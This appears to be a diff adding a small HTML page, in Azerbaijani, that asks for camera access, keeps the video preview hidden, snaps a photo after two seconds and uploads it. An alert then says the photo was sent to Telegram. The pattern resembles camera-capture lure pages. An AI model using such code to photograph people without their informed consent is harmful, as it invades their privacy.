@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Avtomatik Foto Çək</title>
+</head>
+<body>
+  <h1>Kamera açılır və şəkil avtomatik çəkilir</h1>
+  <video id="video" autoplay style="display:none;"></video>
+
+  <script>
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+
+            fetch('/upload', { method: 'POST', body: formData })
+              .then(() => alert('Şəkil Telegrama göndərildi!'))
+              .catch(err => alert('Xəta: ' + err));
+          }, 'image/jpeg');
+        }, 2000); // 2 saniyə gözləmə
+      })
+      .catch(err => alert('Kamera icazəsi lazım!'));
+  </script>
+</body>
+</html>
